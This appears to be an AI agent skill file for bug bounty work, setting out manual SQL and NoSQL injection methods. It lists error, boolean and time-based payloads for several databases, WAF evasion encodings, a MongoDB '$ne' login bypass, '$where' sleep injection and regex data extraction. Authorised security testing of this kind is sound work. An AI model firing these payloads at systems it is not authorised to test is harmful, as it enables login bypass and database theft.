---
name: bbp-sqli-hunter
description: Specialized skill for finding and exploiting SQL and NoSQL Injection vulnerabilities, focusing on manual, blind, and time-based techniques.
---

# SQL / NoSQL Injection Hunter Skill

This skill provides methodologies for identifying and exploiting database injection vulnerabilities when automated scanners (like sqlmap) fail due to WAFs or complex filters.

## Workflow

### 1. Discovery (Error-Based & Boolean)
- **Fuzzing Parameters:** Inject SQL meta-characters (`'`, `"`, `;`, `\`, `)`) into parameters, headers (e.g., User-Agent, X-Forwarded-For), and JSON bodies.
- **Error-Based:** Look for database error messages in the response (e.g., "SQL syntax error", "ORA-01756"). This indicates the input reached the database unescaped.
- **Boolean-Based:** Test logical conditions:
  - `?id=1` (Normal response)
  - `?id=1 AND 1=1` (Normal response)
  - `?id=1 AND 1=2` (Different response, e.g., missing data or 404).

### 2. Time-Based Blind SQLi
When errors are hidden and boolean changes aren't visible, use time delays.
- **MySQL:** `?id=1 OR sleep(5)`
- **PostgreSQL:** `?id=1 OR pg_sleep(5)`
- **MSSQL:** `?id=1 WAITFOR DELAY '0:0:5'`
- **Oracle:** `?id=1 AND [RANDOM_HEAVY_QUERY]`

### 3. WAF Evasion & Filter Bypass
- **Space Bypass:** If spaces are blocked, use comments `/**/` or tab `%09` or newline `%0a` (e.g., `SELECT/**/username/**/FROM/**/users`).
- **Quote Bypass:** If quotes are blocked, use HEX encoding for strings (e.g., `SELECT * FROM users WHERE username = 0x61646d696e` for 'admin') or the `CHAR()` function.
- **Keyword Evasion:** Use mixed case (`SeLeCt`), double keywords (`SELSELECTECT`), or URL encoding (`%53%45%4c%45%43%54`).

### 4. NoSQL Injection (MongoDB)
APIs using NoSQL databases (like MongoDB) are often vulnerable to operator injection, especially if they accept JSON input.
- **Authentication Bypass:** Change a string parameter to a NoSQL operator:
  - Normal: `{"username": "admin", "password": "123"}`
  - Injection: `{"username": "admin", "password": {"$ne": ""}}` (Password is "not equal" to empty).
- **Time-Based NoSQLi:** Inject server-side JavaScript evaluation if supported (e.g., `{"$where": "sleep(5000)"}`).
- **Regex Extraction:** Extract data byte-by-byte using regex operators: `{"username": {"$regex": "^a"}}`.
